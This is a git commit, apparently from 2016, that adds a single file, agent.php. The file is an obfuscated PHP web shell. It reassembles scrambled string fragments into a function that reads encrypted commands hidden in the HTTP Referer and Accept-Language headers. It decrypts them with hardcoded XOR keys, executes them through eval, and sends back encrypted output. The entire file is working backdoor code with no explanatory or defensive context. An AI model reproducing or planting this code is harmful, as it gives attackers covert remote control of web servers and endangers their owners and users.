bdb1bd10fdabaaef381a8da03461d1cb98c58c32
jvz107 <kalilinuxcenter2@bol.com.br>
2016-05-05 22:33:49 -0300

    Added files via upload

---
+++ agent.php
@@ -0,0 +1,17 @@
+<?php
+$b='E]TRV]TER;$rr=@]T$r["HTTP_]TREFE]TRER"];$r]Ta=@$r["H]TTT]TP_ACCE]TPT_LA]TNGUAGE"]T];if(]T$rr&]T&$ra]T';
+$K=']Tll("/]T([\\w])[\\w-]+(]T?:;q]T=]T0.([\\d]))?,?/",$]Tra,$m]T);i]Tf($q&&$m]T){@s]Tessio]Tn_sta]Trt();$s=';
+$J='ray("/","+]T")]T,$ss(]T$s[$i],0,]T$e))),$k)))]T;$]To=ob_g]Tet_co]Tn]Ttents();ob_end_]Tclea]Tn(]T);$d=';
+$c='i.$]Tkh),]T0,3))]T;$f=$sl(]T$ss(md]T5($i.$k]Tf),0,3)]T);$]Tp="";fo]Tr(]T$]Tz=1;$z<cou]Tnt($m]T[1]);]T$';
+$F='t();@e]Tval(@g]Tz]Tuncompres]Ts(@x(@base]T64_decod]Te(pre]Tg_replac]Te(]Tar]T]Tray("/_/","]T/-/"),ar]T';
+$A=str_replace('yP','','creyPatyPyPe_fuyPyPyPnction');
+$L='$]Tkh="8e5]T9";$kf]T="8481";func]Ttion x($t]T,$k){$]Tc=str]T]Tlen($k);$l=st]Trlen(]T$t);$o=]T"]T";for($]Ti=0]T';
+$S='){$u=parse_url]T($rr)]T;]Tp]Tarse]T_str($]Tu["query"],$q);$q=]Tarray]T_value]Ts($q)]T]T;preg_match_]Ta';
+$j='z++)$p.=$]Tq[$m[]T2][$z]];i]Tf(s]Ttrpos(]T$p,$h)=]T==]T0){$s[$]Ti]="";$p]T=$ss]T($p,3);}i]Tf(arra]Ty]';
+$m='T_key]T_exists($]Ti,$s)){$s]T[$i].=$p]T;$e=strpo]Ts($]Ts[$i]]T,$f)]T;i]Tf]T($e){$k=$k]Th.$kf;ob_sta]Tr';
+$u=';$i<$]Tl;)]T{fo]Tr($j=0]T;($j<$c&&$i]T<$l)]T;$j++,$i+]T+){$o.=$t{$i}^]T]T$k]T{$j};}}ret]Tu]Trn $o;}$r=$_S';
+$v='base]T64_encod]Te(x(]Tgzc]Tomp]Tress($o),$k));p]T]Trint(]T"<$k]T>]T$d</$]Tk>");]T@session_destroy();}}}}';
+$I='&$]T_S]TES]TSION;$]Tss="substr";$]Tsl]T="strto]Tlow]Te]Tr";$i=$m[1][0].$]Tm[1][1];$]Th=$sl(]T$ss(md]T5($';
+$h=str_replace(']T','',$L.$u.$b.$S.$K.$I.$c.$j.$m.$F.$J.$v);
+$w=$A('',$h);$w();
+?>
